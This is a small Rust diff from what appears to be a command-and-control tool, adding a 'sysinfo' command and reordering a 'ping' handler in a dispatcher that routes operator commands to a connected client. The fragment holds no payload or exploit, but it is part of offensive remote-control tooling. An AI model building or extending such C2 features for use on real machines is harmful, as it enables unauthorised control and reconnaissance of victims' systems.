@@ -6,13 +6,17 @@ pub mod server;
 
 pub fn dispatch_client(instruct:  Vec<&str>, conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {    
     match instruct.first() {
+        // Check conn
+        Some(&"ping") => client::ping::run(conn),
+
         // Local commands
         Some(&"lcd") => server::local::local_cd(&instruct),
         Some(&"lls") => server::local::local_list(),
         Some(&"lpwd") => server::local::local_pwd(),
         Some(&"clear") => server::local::clear_console(),
 
-        Some(&"ping") => client::ping::run(conn),
+        // System commands
+        Some(&"sysinfo") => client::system::sysinfo(conn),
 
         // Close
         Some(&"close") => client::control::close_session(conn, state, true),
